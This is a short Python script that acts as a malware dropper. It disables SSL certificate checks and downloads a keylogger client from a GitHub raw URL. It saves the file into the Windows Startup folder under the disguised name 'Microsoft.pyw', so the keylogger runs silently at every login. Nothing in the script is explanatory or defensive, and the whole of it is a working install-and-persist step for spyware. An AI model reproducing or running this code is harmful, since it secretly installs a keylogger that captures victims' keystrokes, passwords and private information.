#--------start-------------
import os,urllib.request,ssl
ssl._create_default_https_context = ssl._create_unverified_context
percorsoB='C:\\Users\\'+os.getlogin()+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
url='https://raw.githubusercontent.com/simonemastella/keyLogger/only_client/'
urllib.request.urlretrieve(url+'keyloggerClient.py', percorsoB+'Microsoft.pyw')
#---------end-----------